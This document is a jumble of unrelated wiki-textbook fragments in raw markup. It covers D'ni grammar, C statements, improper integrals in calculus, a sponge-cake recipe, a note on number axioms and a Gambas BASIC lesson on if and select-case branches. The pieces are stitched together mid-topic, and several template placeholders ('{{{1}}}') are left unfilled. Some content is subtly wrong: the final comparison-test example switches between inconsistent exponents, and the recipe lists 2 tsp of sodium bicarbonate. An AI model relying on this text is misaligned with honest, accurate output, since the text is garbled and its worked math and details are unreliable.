*When a word has several modifiers (adjectives, adverbs), the closer a modifier is to that word, the greater its significance. While English has them scattered on both sides of the noun, D'ni arranges them all afterwards in descending order of significance, single-word adjectives first, then adjectival phrases.
*The bond between verb and object is very strong and can never be broken. Thus, when adverbs are introduced into a sentence that has both verb and object, they don't come directly after the verb as would be expected but rather are placed after the object.

==Commas== 
*The repeating ‘and’ ''ga'' between a series of words is correct, so it is okay to say 'I walked between rocks and plants and trees and mountains and caves and animals' while in English it might be annoying...

==Quantity==
*Quantity factor such as 'a bit', 'very' or 'a lot' are expressed with preposition ''b' '' followed by a number between 1 and 25. ''B'fasí'' ('to 25') means 'absolutely'. Numbers above 25 are used for exaggeration. See also [[../Numbers/]]

This does seem like a lot of typing but don't worry: Ada allows you to declare shorter aliasnames if you need a long statement very often.

      <text xml:space="preserve">{{C Programming}}

A '''statement''' is a command given to the computer that instructs the computer to take a specific action, such as display to the screen, or collect input. A computer program is made up of a series of statements.

&lt;noinclude&gt;__TOC__&lt;/noinclude&gt;

 printf (&quot;Hi there!&quot;);

 printf (&quot;Hi there!&quot;);
 prinft (&quot;Strange things are afoot...&quot;);

In C, a statement can be any of the following:

== Labeled Statements ==

A statement can be preceded by a label. Three types of labels exist in C.

A simple identifier followed by a colon (&lt;code&gt;:&lt;/code&gt;) is a label. Usually, this label is the target of a &lt;code&gt;goto&lt;/code&gt; statement.

Within &lt;code&gt;switch&lt;/code&gt; statements, &lt;code&gt;case&lt;/code&gt; and &lt;code&gt;default&lt;/code&gt; labeled statements exist. A statement of the form

&lt;code&gt;case&lt;/code&gt; ''constant-expression'' &lt;code&gt;:&lt;/code&gt; ''statement''

indicates that control will pass to this statement if the value of the control expression of the &lt;code&gt;switch&lt;/code&gt; statement matches the value of the ''constant-expression''. A statement of the form

&lt;code&gt;default&lt;code&gt; &lt;code&gt;:&lt;/code&gt; ''statement''

indicates that control will pass to this statement if the control expression of the &lt;code&gt;switch&lt;/code&gt; statement does not match any of the ''constant-expressions'' within the &lt;code&gt;switch&lt;/code&gt; statement. If the &lt;code&gt;default&lt;/code&gt; statement is omitted, the control will pass to the statement following the &lt;code&gt;switch&lt;/code&gt; statement.

== Compound Statements ==

A ''compound statement'' is the way C groups multiple statements into a single statement. It consists of multiple statements and declarations within braces (i.e. &lt;code&gt;{&lt;/code&gt; and &lt;code&gt;}&lt;/code&gt;). In the ANSI C Standard of 1989-1990, a compound statement contained an optional list of declarations followed by an optional list of statements; in more recent revisions of the Standard, declarations and statements can be freely interwoven through the code. The body of a function is also a compound statement by rule.

== Expression Statements ==

An ''expression statement'' consists of an optional expression followed by a semicolon (&lt;code&gt;;&lt;/code&gt;). If the expression is present, the statement may have a value. If no expression is present, the statement is often called the ''null statement''.

The &lt;code&gt;puts&lt;/code&gt; function calls are expressions, so the statements above are expression statements.

== Selection Statements ==

Three types of selection statements exist in C:

&lt;code&gt;if&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression'' &lt;code&gt;)&lt;/code&gt; ''statement''

In this type of if-statement, the sub-statement will only be executed iff the expression is non-zero.

&lt;code&gt;if&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression'' &lt;code&gt;)&lt;/code&gt; ''statement'' &lt;code&gt;else&lt;/code&gt; ''statement''

In this type of if-statement, the first sub-statement will only be executed iff the expression is non-zero; otherwise, the second sub-statement will be executed. Each &lt;code&gt;else&lt;/code&gt; matches up with the closest unmatched &lt;code&gt;if&lt;/code&gt;, so that the following two snippets of code are not equal:

 if (expression)
   if (secondexpression) statement1;
 else
   statement2;

 if (expression)
   {
     if (secondexpression) statement1;
   }
 else
   statement2;

because in the first, the &lt;code&gt;else&lt;/code&gt; statement matches up with the if statement that has &lt;code&gt;secondexpression&lt;/code&gt; for a control, but in the second, the braces force the &lt;code&gt;else&lt;/code&gt; to match up with the if that has &lt;code&gt;expression&lt;/code&gt; for a control.

Switch statements are also a type of selection statement. They have the format

&lt;code&gt;switch&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression'' &lt;code&gt;)&lt;/code&gt; ''statement''

The statement here is usually compound and it contains case-labeled statements and optionally a default-labeled statement.

== Iteration Statements ==

C has three kinds of iteration statements. The first is a while-statement with the form

&lt;code&gt;while&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression'' &lt;code&gt;)&lt;/code&gt; ''statement''

The substatement of a while runs repeatedly as long as the control expression evaluates to non-zero at the beginning of each iteration. If the control expression evaluates to zero the first time through, the substatement may not run at all.

The second is a do-while statement of the form

&lt;code&gt;do&lt;/code&gt; ''statement'' &lt;code&gt;while&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression'' &lt;code&gt;)&lt;/code&gt; &lt;code&gt;;&lt;/code&gt;

This is similar to a while loop, except that the controlling expression is evaluated at the end of the loop instead of the beginning and consequently the sub-statement must execute at least once.

The third type of iteration statement is the for-statement. In ANSI C 1989, it has the form

&lt;code&gt;for&lt;/code&gt; &lt;code&gt;(&lt;/code&gt; ''expression&lt;sub&gt;opt&lt;/sub&gt;'' &lt;code&gt;;&lt;/code&gt; ''expression&lt;sub&gt;opt&lt;/sub&gt;'' &lt;code&gt;;&lt;/code&gt; ''expression&lt;sub&gt;opt&lt;/sub&gt;'' &lt;code&gt;)&lt;/code&gt; ''statement''

In more recent versions of the C standard, a declaration can substitute for the first expression. The ''opt'' subscript indicates that the expression is optional.

The statement

  for (e1; e2; e3)
    s;

is the rough equivalent of

  {
    e1;
    while (e2)
      {
        s;
        e3;
      }
  }

except for the behavior of &lt;code&gt;continue&lt;/code&gt; statements within &lt;code&gt;s&lt;/code&gt;.

The &lt;code&gt;e1&lt;/code&gt; expression represents an initial condition; &lt;code&gt;e2&lt;/code&gt; a control expression; and &lt;code&gt;e3&lt;/code&gt; what to happen on each iteration of the loop. If &lt;code&gt;e2&lt;/code&gt; is missing, the expression is considered to be non-zero on every iteration, and only a &lt;code&gt;break&lt;/code&gt; statement within &lt;code&gt;s&lt;/code&gt; (or a call to a non-returning function such as &lt;code&gt;exit&lt;/code&gt; or &lt;code&gt;abort&lt;/code&gt;) will end the loop. 

== Jump Statements ==

C has four types of jump statements. The first, the &lt;code&gt;goto&lt;/code&gt; statement, is used sparingly and has the form

&lt;code&gt;goto&lt;/code&gt; ''identifier'' &lt;code&gt;;&lt;/code&gt;

This statement transfers control flow to the statement labeled within the given identifier.

The second, the break statement, with the form

&lt;code&gt;break&lt;/code&gt; &lt;code&gt;;&lt;/code&gt;

is used within iteration statements and &lt;code&gt;switch&lt;/code&gt; statements to pass control flow to the statement following the while, do-while, for, or switch.

The third, the continue statement, with the form

&lt;code&gt;continue&lt;/code&gt; &lt;code&gt;;&lt;/code&gt;

is used within the substatement of interation statements to transfer control flow to the place just before the end of the substatement. In &lt;code&gt;for&lt;/code&gt; statements the iteration expression will then be executed before the controlling expression is evaluated.

The fourth type of jump statement is the return statement with the form

&lt;code&gt;return&lt;/code&gt; ''expression&lt;sub&gt;opt&lt;/sub&gt;'' &lt;code&gt;;&lt;/code&gt;

This statement returns from the function. If the function return type is &lt;code&gt;void&lt;/code&gt;, the function may not return a value; otherwise, the expression represents the value to be returned.

In this case, the command &lt;tt&gt;&quot;{{{1}}}&quot;&lt;/tt&gt; means &quot;show on the screen,&quot; not &quot;print on the printer.&quot;  The programmer either gives the statement directly to the computer (by typing it while running a special program), or creates a text file with the command in it.

      <text xml:space="preserve">The computer will perform each of these commands sequentially.  It's invaluable to be able to &quot;play computer&quot; when programming.  Ask yourself, &quot;If I were the computer, what would I do with these statements?&quot;  If you're not sure what the answer is, then you are very likely to write incorrect code.  Stop and check the manual for the programming language you're using.

In the above case, the computer will look at the first statement, determine that it's a &lt;tt&gt;{{{1}}}&lt;/tt&gt; statement, look at what needs to be printed, and display that text on the computer screen.  It'll look like this:

 Hi there!

Note that the quotation marks aren't there.  Their purpose in the program is to tell the computer where the text begins and ends, just like in English prose.  The computer will then continue to the next statement, perform its command, and the screen will look like this:

 Hi there!
 Strange things are afoot...

When the computer gets to the end of the text file, it stops. There are many different kinds of statements, depending on which programming language is being used. For example, there could be a &lt;tt&gt;beep&lt;/tt&gt; statement that causes the computer to output a beep on its speaker, or a &lt;tt&gt;window&lt;/tt&gt; statement that causes a new window to pop up.

Also, the way statements are written will vary depending on the programming language.  These differences are fairly superficial.  The set of rules like the first two is called a programming language's '''''syntax'''''.  The set of verbs is called its '''''library'''''.

      <text xml:space="preserve">{{Calculus/Top Nav|Indefinite integral|Integration techniques/Infinite Sums}}

The definition of a definite integral:

:&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;

requires the interval [a,b] be finite.  The Fundamental Theorem of Calculus requires that ''f'' be continuous on [a,b].  In this section, you will be studying a method of evaluating integrals that fail these requirements&amp;mdash;either because their limits of integration are infinite, or because a finite number of discontinuities exist on the interval [a,b].  Integrals that fail either of these requirements are '''improper integrals'''.  (If you are not familiar with [[Calculus/L'Hôpital's rule|L'Hôpital's rule]], it is a good idea to review it before reading this section.)

== Improper Integrals with Infinite Limits of Integration ==

Consider the integral

:&lt;math&gt;\int_{1}^{\infin} \frac{dx}{x^2} &lt;/math&gt;

Assigning a finite upper bound &lt;math&gt;b&lt;/math&gt; in place of infinity gives

:&lt;math&gt; \lim_{b \to \infin} \int_{1}^{b} \frac{dx}{x^2} = \lim_{b \to \infin}\left(\frac{1}{1} -\frac{1}{b}\right)\  =  \lim_{b \to \infin}\left(1-\frac{1}{b}\right)\ = 1 &lt;/math&gt;

This improper integral can be interpreted as the area of the unbounded region between &lt;math&gt;f(x)=1/x^2&lt;/math&gt;, &lt;math&gt;y=0&lt;/math&gt; (the &lt;math&gt;x&lt;/math&gt;-axis), and &lt;math&gt;x=1&lt;/math&gt;.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
=== Definition ===
1. Suppose &lt;math&gt;\int_a^b f(x) dx&lt;/math&gt; exists for all &lt;math&gt;b\ge a&lt;/math&gt;.  Then we define 
:&lt;math&gt;\int_{a}^{\infin} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{b \to \infin}\int_{a}^{b} f(x)\, dx,&lt;/math&gt; as long as this limit exists and is finite.  
If it does exist we say the integral is '''convergent''' and otherwise we say it is '''divergent'''.

2. Similarly if &lt;math&gt;\int_a^b f(x) dx&lt;/math&gt; exists for all &lt;math&gt;a\le b&lt;/math&gt; we define 
:&lt;math&gt;\int_{-\infin}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{a \to -\infin}\int_{a}^{b} f(x)\, dx.&lt;/math&gt;

3. Finally suppose &lt;math&gt;c&lt;/math&gt; is a fixed real number and that &lt;math&gt;\int_{-\infin}^{c} f(x)\, dx&lt;/math&gt; and &lt;math&gt;\int_{c}^{\infin} f(x)\, dx&lt;/math&gt; are both convergent.  Then we define
:&lt;math&gt;\int_{-\infin}^{\infin} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\int_{-\infin}^{c} f(x)\, dx + \int_{c}^{\infin} f(x)\, dx.&lt;/math&gt;
&lt;/blockquote&gt;

{{ExampleRobox|title=Example: Convergent Improper Integral}}

We claim that
:&lt;math&gt;\int_{0}^{\infin} e^{-x}\, dx=1&lt;/math&gt;

To do this we calculate
:{|
|&lt;math&gt; \int_{0}^{\infin} e^{-x} dx &lt;/math&gt;
|=
|&lt;math&gt; \lim_{b \to \infin} \int_{0}^{b} e^{-x} dx &lt;/math&gt;
|-
|
|=
|&lt;math&gt; \lim_{b \to \infin} (-e^{-x})\bigr|_0^b &lt;/math&gt;
|-
|
|=
|&lt;math&gt; \lim_{b \to \infin} \left(-e^{-b}+1 \right) &lt;/math&gt;
|-
|
|=
|&lt;math&gt; 1 \,&lt;/math&gt;
|-
|
|}
{{Robox/Close}}

{{ExampleRobox|title=Example: Divergent Improper Integral}}

We claim that the integral
:&lt;math&gt;\int_{1}^{\infin} \frac{dx}{x}\,&lt;/math&gt; diverges.

This follows as
:{|
|&lt;math&gt;\int_{1}^{\infin} \frac{dx}{x}\,&lt;/math&gt;
|=
|&lt;math&gt;\lim_{b \to \infin}\int_{1}^{b} \frac{dx}{x}\,&lt;/math&gt;
|-
| 
|=
|&lt;math&gt;\lim_{b \to \infin}(\ln x)\bigr|_1^b&lt;/math&gt;
|-
| 
|=
|&lt;math&gt;\lim_{b \to \infin}\left(\ln b - 0\right)&lt;/math&gt;
|-
|
|=
|&lt;math&gt; \infin \,&lt;/math&gt;
|-
|
|}

Therefore 

:&lt;math&gt; \int_{1}^{\infin} \frac{dx}{x}\,&lt;/math&gt; diverges.
{{Robox/Close}}

{{ExampleRobox|title=Example: Improper Integral}}

Find &lt;math&gt;\int_0^\infty x^2e^{-x} dx.&lt;/math&gt;

To calculate the integral use integration by parts twice to get
:&lt;math&gt;\begin{align}
\int_0^b x^2 e^{-x} dx &amp;= (-x^2 e^{-x})\bigr|_0^b + 2 \int_0^b x e^{-x}dx\\
&amp;=-b^2 e^{-b} + 2 ((-x e^{-x})\bigr|_0^b +  \int_0^b e^{-x}dx)\\
&amp;=-b^2 e^{-b} + 2 (-b e^{-b} - (e^{-x})\bigr|_0^b )\\
&amp;=-b^2 e^{-b} + 2 (-b e^{-b} - e^{-b}+1).\\
\end{align}&lt;/math&gt;

Now &lt;math&gt;\lim_{b\to \infty} e^{-b} =0&lt;/math&gt; and because exponentials overpower polynomials, we see that &lt;math&gt;\lim_{b\to \infty} b^2 e^{-b} =0&lt;/math&gt; and &lt;math&gt;\lim_{b\to \infty} b e^{-b} =0&lt;/math&gt; as well.   Hence,
:&lt;math&gt;\int_0^\infty x^2 e^{-x} dx =\lim_{b\to\infty} \int_0^b x^2 e^{-x} dx=0+2(0-0+1)=2.&lt;/math&gt;
{{Robox/Close}}

{{ExampleRobox|title=Example: Powers}}

Show &lt;math&gt;\int_{1}^{\infin} \frac{dx}{x^p}\,=\begin{cases} \frac{1}{p-1}, &amp; \mbox{if }p&gt;1 \\ \mbox{diverges}, &amp; \mbox{if }p\le1 \end{cases}&lt;/math&gt;}}

If &lt;math&gt;p\neq 1&lt;/math&gt; then
:{|
| &lt;math&gt;\int_{1}^{\infin} \frac{dx}{x^p}\,&lt;/math&gt;
| =
| &lt;math&gt;\lim_{b \to \infin}\int_{1}^{b} x^{-p} dx\,&lt;/math&gt;
|-
| 
| =
| &lt;math&gt;\lim_{b \to \infin} (\frac{1}{-p+1} x^{-p+1})\bigr|_1^b&lt;/math&gt;
|-
|
| =
| &lt;math&gt; \frac{1}{1-p} \lim_{b \to \infin}  \left(b^{-p+1}-1\right)&lt;/math&gt;
|-
|
| =
| &lt;math&gt;\begin{cases} \frac{1}{p-1}, &amp; \mbox{if }p&gt;1 \\ \mbox{diverges}, &amp; \mbox{if }p&lt;1.\end{cases}&lt;/math&gt;
|}

Notice that we had to assume that &lt;math&gt;p\ne 1&lt;/math&gt; to avoid dividing by zero.  However the &lt;math&gt;p=1&lt;/math&gt; case was done in a previous example.

== Improper Integrals with a Finite Number Discontinuities ==

First we give a definition for the integral of functions which have a discontinuity at one point.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;

=== Definition of improper integrals with a single discontinuity ===
If ''f'' is continuous on the interval [''a'',''b'') and is discontinuous at ''b'', we define :&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{c \to b^-}\int_{a}^{c} f(x)\, dx.&lt;/math&gt;

If the limit in question exists we say the integral '''converges''' and otherwise we say it '''diverges'''.  

Similarly if ''f'' is continuous on the interval(''a'',''b''] and is discontinuous at ''a'', we define
:&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{c \to a^+}\int_{c}^{b} f(x)\, dx.&lt;/math&gt;

Finally suppose ''f'' has an discontinuity at a point c in (''a'',''b'') and is continuous at all other points in [''a'',''b''].  If &lt;math&gt;\int_{a}^{c} f(x)\, dx&lt;/math&gt; and &lt;math&gt;\int_{c}^{b} f(x)\, dx&lt;/math&gt; converge we define
:&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\int_{a}^{c} f(x)\, dx+\int_{c}^{b} f(x)\, dx&lt;/math&gt;
&lt;/blockquote&gt;

{{ExampleRobox|title=Example 1}}

Show &lt;math&gt;\int_{0}^{1} \frac{dx}{x^p}\,=\begin{cases} \frac{1}{1-p}, &amp; \mbox{if }p&lt;1 \\ \mbox{diverges}, &amp; \mbox{if }p\ge1 \end{cases}&lt;/math&gt;

If &lt;math&gt;p\neq 1&lt;/math&gt; then
:{|
| &lt;math&gt;\int_{0}^{1} \frac{dx}{x^p}\,&lt;/math&gt;
| =
| &lt;math&gt;\lim_{a \to 0^+}\int_{a}^{1} x^{-p} dx\,&lt;/math&gt;
|-
| 
| =
| &lt;math&gt;\lim_{a \to 0^+} (\frac{1}{-p+1} x^{-p+1})\bigr|_a^1&lt;/math&gt;
|-
|
| =
| &lt;math&gt; \frac{1}{1-p} \lim_{a \to 0^+}  \left(1-a^{-p+1}\right)&lt;/math&gt;
|-
|
| =
| &lt;math&gt;\begin{cases} \frac{1}{1-p}, &amp; \mbox{if }p&lt;1 \\ \mbox{diverges}, &amp; \mbox{if }p&gt;1.\end{cases}&lt;/math&gt;
|}

Notice that we had to assume that &lt;math&gt;p\ne 1&lt;/math&gt; do avoid dividing by zero.  So instead we do the &lt;math&gt;p=1&lt;/math&gt; case separately,
:&lt;math&gt;\int_0^1 \frac{1}{x} dx = \lim_{a\to 0^+} (\ln |x|)\bigr|_a^1= \lim_{a\to 0^+} -\ln a&lt;/math&gt;
which diverges.

The integral &lt;math&gt;\int_{-1}^3 \frac{1}{x-2}dx &lt;/math&gt; is improper because the integrand is not continuous at x=2.  However had we not noticed that we might have been tempted to apply the fundamental theorem of calculus and conclude that it equals
:&lt;math&gt; (\ln |x-2|)\bigr|_{-1}^3 = \ln(5)- \ln (3) = \ln (5/3),&lt;/math&gt;

which is not correct.  In fact the integral diverges since
:&lt;math&gt;\begin{align}\int_{-1}^3 \frac{1}{x-2}dx &amp;= \lim_{b\to 2^-}\int_{-1}^b \frac{1}{x-2}dx + \lim_{a\to 2^+}\int_a^3 \frac{1}{x-2}dx\\
&amp;=\lim_{b\to 2^-}(\ln |x-2|)\bigr|_{-1}^{b} +\lim_{a\to 2^+}(\ln |x-2|)\bigr|_{a}^{3}\\
&amp;=\lim_{b\to 2^-}(\ln (2-b)-\ln 3) +\lim_{a\to 2^+}(\ln 1-\ln (a-2))\\
&amp;=\lim_{b\to 2^-}(\ln (2-b))-\ln 3 +\lim_{a\to 2^+}(-\ln (a-2))\\
\end{align}&lt;/math&gt;
and &lt;math&gt;\lim_{b\to 2^-}(\ln (2-b))&lt;/math&gt; and &lt;math&gt;\lim_{a\to 2^+}(-\ln (a-2))&lt;/math&gt; both diverge.

We can also give a definition of the integral of a function with a finite number of discontinuities.

=== Definition: Improper integrals with finite number of discontinuities ===
Suppose ''f'' is continuous on [a,b] except at points &lt;math&gt;c_1&lt;c_2&lt;\ldots&lt;c_n&lt;/math&gt; in [a,b]. We define
&lt;math&gt;\int_a^b f(x) dx = \int_a^{c_1} f(x) dx + \int_{c_1}^{c_2} f(x) dx +\int_{c_2}^{c_3} f(x) dx + \cdots + \int_{c_{n-1}}^{c_n} f(x) dx + \int_{c_n}^{b} f(x) dx&lt;/math&gt;
as long as each integral on the right converges.
&lt;/blockquote&gt;

Notice that by combining this definition with the definition for improper integrals with infinite endpoints, we can define the integral of a function with a finite number of discontinuities with one or more infinite endpoints.

== Comparison Test ==

There are integrals which cannot easily be evaluated.  However it may still be possible to show they are convergent by comparing them to an integral we already know converges.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
'''Theorem (Comparison Test)'''
Let ''f'' and ''g'' be continuous functions defined for all &lt;math&gt;x\ge a&lt;/math&gt;.
# Suppose &lt;math&gt;g(x)\ge f(x)\ge 0&lt;/math&gt; for all &lt;math&gt;x\ge a&lt;/math&gt;.  Then if &lt;math&gt;\int_a^\infty g(x) dx&lt;/math&gt; converges so does &lt;math&gt;\int_a^\infty f(x) dx.&lt;/math&gt; 
# Suppose &lt;math&gt;f(x)\ge h(x)\ge 0&lt;/math&gt; for all &lt;math&gt;x\ge a&lt;/math&gt;.  Then if &lt;math&gt;\int_a^\infty h(x) dx&lt;/math&gt; diverges so does &lt;math&gt;\int_a^\infty f(x) dx.&lt;/math&gt;
&lt;/blockquote&gt;

A similar theorem holds for improper integrals of the form &lt;math&gt;\int_{-\infty}^b f(x) dx&lt;/math&gt; and for improper integrals with discontinuities.

{{ExampleRobox|title=Example: Use of comparsion test to show convergence}}

Show that &lt;math&gt;\int_1^{\infty} \frac{\sin x+2}{x^2} dx&lt;/math&gt; converges.

For all ''x'' we know that &lt;math&gt;-1\le \sin x \le 1&lt;/math&gt; so &lt;math&gt;1\le \sin x+2\le 3&lt;/math&gt;.  This implies that
:&lt;math&gt; 0\le \frac{\sin x+2}{x^2} \le \frac{3}{x^2}&lt;/math&gt;.

We have seen that &lt;math&gt;\int_1^{\infty} \frac{3}{x^2} dx = 3\int_1^{\infty} \frac{1}{x^2} dx&lt;/math&gt; converges.   So  putting &lt;math&gt;f(x) = \frac{\sin x+2}{x^2}&lt;/math&gt; and &lt;math&gt;g(x) = \frac{3}{x^2}&lt;/math&gt; into the comparison test we get that the integral &lt;math&gt;\int_1^{\infty} \frac{\sin x+2}{x^2} dx&lt;/math&gt; converges as well.

{{ExampleRobox|title=Example: Use of Comparsion Test to show divergence}}

Show that &lt;math&gt;\int_1^{\infty} \frac{\sin x+2}{x} dx&lt;/math&gt; diverges.

Just as in the previous example we know that &lt;math&gt;\sin x+2\ge 1&lt;/math&gt; for all ''x''.  Thus
:&lt;math&gt; \frac{\sin x+2}{x} \ge \frac{1}{x} \ge 0.&lt;/math&gt;

We have seen that &lt;math&gt;\int_1^{\infty} \frac{1}{x} dx &lt;/math&gt; diverges.  So putting &lt;math&gt;  f(x) = \frac{\sin x+2}{x}&lt;/math&gt; and &lt;math&gt;g(x) = \frac{1}{x}&lt;/math&gt; into the comparison test we get that &lt;math&gt;\int_1^{\infty} \frac{\sin x+2}{x} dx&lt;/math&gt; diverges as well.

=== An extension of the comparison theorem ===
To apply the comparison theorem you do not really need &lt;math&gt;g(x) \ge f(x) \ge 0&lt;/math&gt; for ''all'' &lt;math&gt;x\ge a&lt;/math&gt;.  What we actually need is this inequality holds for sufficiently large ''x'' (i.e. there is a number ''c'' such that &lt;math&gt;g(x) \ge f(x)&lt;/math&gt; for all &lt;math&gt;x\ge c&lt;/math&gt;).  For then
:&lt;math&gt; \int_a^\infty f(x) dx = \int_a^c f(x) dx + \int_c^{\infty} f(x) dx,&lt;/math&gt;
so the first integral converges if and only if third does, and we can apply the comparison theorem to the &lt;math&gt; \int_c^\infty f(x) dx&lt;/math&gt; piece.


{{ExampleRobox|title=Example}}

Show that &lt;math&gt;\int_1^{\infty} x^{7/2} e^{-\frac{3x}{2}} dx&lt;/math&gt; converges.

The reason that this integral converges is because for large ''x'' the &lt;math&gt;e^{-x}&lt;/math&gt; factor in the integrand is dominant.   We could try comparing &lt;math&gt; x^{7/2} e^{-x} &lt;/math&gt; with &lt;math&gt;e^{-x}&lt;/math&gt;, but as &lt;math&gt;x\ge 1&lt;/math&gt;, the inequality
:&lt;math&gt; x^{7/2} e^{-x} \ge e^{-x} &lt;/math&gt;
is the wrong way around to show convergence.

Instead we rewrite the integrand as
&lt;math&gt;x^{3/2} e^{-\frac{3x}{2}} dx= x^{7/2} e^{-\frac{x}{2}} e^{-x} dx.
&lt;/math&gt; 

Since the limit &lt;math&gt;\lim_{x\to \infty} x^{7/2} e^{-\frac{x}{2}} = 0&lt;/math&gt; we know that for ''x'' sufficiently large we have &lt;math&gt; x^{3/2} e^{-\frac{x}{2}} \le 1&lt;/math&gt;.  So for large ''x'',
:&lt;math&gt; x^{7/2} e^{\frac{-7x}{2}} = x^{7/2} e^{-\frac{x}{2}} e^{-x} \le e^{-x}.&lt;/math&gt;
Since the integral &lt;math&gt; \int_1^{\infty} e^{-x} dx&lt;/math&gt; converges the comparison test tells us that &lt;math&gt; \int_a^{\infty} x^{7/2} e^{\frac{-3x}{2}} &lt;/math&gt; converges as well.

Sponge cake is the most commonly recognised variety of baked confectionery in Britain. It has a sweet taste, often flavoured with vanilla, chocolate or other additions, and can be cut and displayed in a number of different ways.

An [[Cookbook:Sponge Cake|easier version of this recipe]] is available that does not require a kitchen scale.

==Ingredients==
===For the cake===
* 2 [[Cookbook:Egg|eggs]], USDA large (2 to 2.25 [[Cookbook:Ounce|oz]], 56.6 to 63.7 [[Cookbook:g|g]]) or EU size M (53 to 63 [[Cookbook:g|g]])
'''Important: Weigh the eggs and substitute ''n'' for the eggs' weight.''' 
* self-raising [[Cookbook:Flour|flour]] (''n'')
* [[Cookbook:Caster sugar|caster sugar]] (''n'')
* butter (''n'')
* sodium bicarbonate (2tsp) (baking powder, baking soda or bicarbonate of soda)

====Extras (optional)====
* [[Cookbook:vanilla|vanilla extract]] (1-2 tsp)
* food colouring (a few drops)
* chocolate powder (unsweetened baking cocoa) (according to taste. Use 3g less flour for every 4g added.)

===Filling===
Choose one of these to spread between two cakes if making a cake with more than two eggs.
* 2-4 tbsp jam (softened with pallette knife or similar) or
* buttercream (cream together 100g caster sugar and 100g butter)

===Dredging===
One of the following:
* 75g icing sugar (superfine)
* 70g caster sugar (fine)
* 65g granulated sugar (medium)
* 55g [[Cookbook:Demerara Sugar|demerara sugar]] (large crunchy crystals)

==Equipment==
* 1 large mixing bowl
* 1 set of scales
* 1 wooden spoon

==Method==
#Preheat an oven to 200 degrees Centigrade.

===Preparation===
#Cream together the sugar and butter in the mixing bowl. They should achieve a creamy texture with quite a thick consistency. The longer, harder and faster the butter and sugar are creamed the lighter the cake will be when cooked.
#Add both eggs and mix well.
#Add all the flour and mix well.
#Add any food colouring, flavouring, etc. at this point. If you add liquid ingredients, add the same volume again of sugar and flour mix to compensate. If adding dry ingredients, ensure to use 3g less flour for every 4g of extra dry ingredients added.
#Beat with wooden spoon in a circular motion, trying to incorporate as much air as possible.

===Cooking===
#Grease one or two cake tins with butter.
#Spoon, then scrape, as much cake mixture as possible into the tins. If using two tins, try to ensure that each tin contains an equal amount of cake mixture and is not more than 3/4 filled.
#Put the tins into the oven and leave them for approximately 10 minutes before checking them. The cooking time should reach around 15 minutes: keep checking them regularly after about 8 minutes since all ovens vary.

===Post-cooking===

====One cake====
#Turn the cake out onto a wire rack to cool.
#When cool, dredge with sugar using a spoon.

====Two or more cakes====
#Turn the cakes out onto a wire rack to cool.
#When cool, turn one of them upside down and spread your filling onto it.
#Place the other cake (top up) onto the upside-down cake and dredge the cake with sugar using a spoon.

      <text xml:space="preserve">There is an axiom for mod missing, something like

This axiom also implies NT 14. 

Moreover, the 14 axioms should not be called &quot;the axioms&quot; for numbers,

NT3 is only a very weak form of it, and not even the strongest possible

===What are branches in a program?===
A branch is a point at which your program must make a choice. With these structures, it is possible to make programs that can have multiple outcomes. There are mainly two branching methods:
*if then and ist variations
*select case

===If...Then statement===
The if then branch works quite the same as it is used in natural language. If something is true , then make something. If it is not true then just continue.

Try this little example: You just need a command button on your form to get it going. The output is shown in the terminal window. 

 PUBLIC SUB Button1_Click()
 k AS Integer
 FOR k = 1 TO 10000
  IF k = 5000 THEN PRINT &quot;5000 has been reached !&quot;
 NEXT
 END

Try to alter the program so that the output is shown in a textbox. 
You have to add a textbox to your form. You will find it with F6 in your toolbox. Then you have to change the code, so that the print command is exchanged.

 PUBLIC SUB Button1_Click()
 k AS Integer
 FOR k = 1 TO 10000
  IF k = 5000 THEN textbox1.text = &quot;5000 has been reached !&quot;
 NEXT
 END

===If...Then...Else...End if===

You can modify the if-then construction by adding some other commands like else and end if. 
There ist another example with an '''else''' and '''end if''' command in it. 
You just need a command button on your form to get it going.

  PUBLIC SUB Button1_Click()
  k AS Integer
  FOR k = 1 TO 6000
   IF k &lt; 5000 THEN    
      PRINT k
    ELSE
      PRINT &quot;5000 has been reached!&quot;
    END IF
  NEXT
 END

The program counts from 1 to 6000 . When the number 5000 is reached , you get a message in the terminal window.

You have to be aware of the right outline , otherwise it wont work.


Here is another example using the toggle button: It shows a message withot a messagebox and the message can be copied into the clipboard.
You need a toggle button and a textarea to get it going. You should change the property of the textarea to
*Visible = false 

When you click the button then the text will appear. When you click once again, the text will disappear.

 PUBLIC SUB ToggleButton1_Click()
 DIM Help AS String
  IF TextArea1.Visible = FALSE THEN 
    ToggleButton1.Text = &quot;Close Info &quot;
    Help = &quot;Hello, this is a info&quot; &amp; Chr(13) &amp; Chr(10)
    Help = Help &amp; &quot;www.madeveryeasy.de&quot; &amp; Chr(13) &amp; Chr(10)
    Help = Help &amp; &quot;rho55@gmx.de&quot;
    TextArea1.Visible = TRUE
    TextArea1.text = Help
  ELSE 
   TextArea1.Visible = FALSE
    ToggleButton1.Text = &quot;Show Info&quot;
  ENDIF
 END

===Select Case===
If you want to branch and you have more than 2 possible answers, then you can use the select-case command.
Try this little example to get used to it. You just need an empty form to get it going. The output will be done in the terminal window.

 PUBLIC SUB Form_Open()
  PRINT Now
  PRINT WeekDay(Now)
   SELECT CASE WeekDay(Now) 
    CASE 1 
      PRINT &quot;Monday&quot; 
    CASE 2 
      PRINT &quot;Tuesday&quot;
    CASE 3 
      PRINT &quot;Wednesday&quot; 
    CASE 4 
      PRINT &quot;Thursday&quot; 
    CASE 5 
      PRINT &quot;Friday&quot; 
    CASE 6 
      PRINT &quot;Saturday&quot; 
    CASE 7 
      PRINT &quot;Sunday&quot; 
  END SELECT 
 END

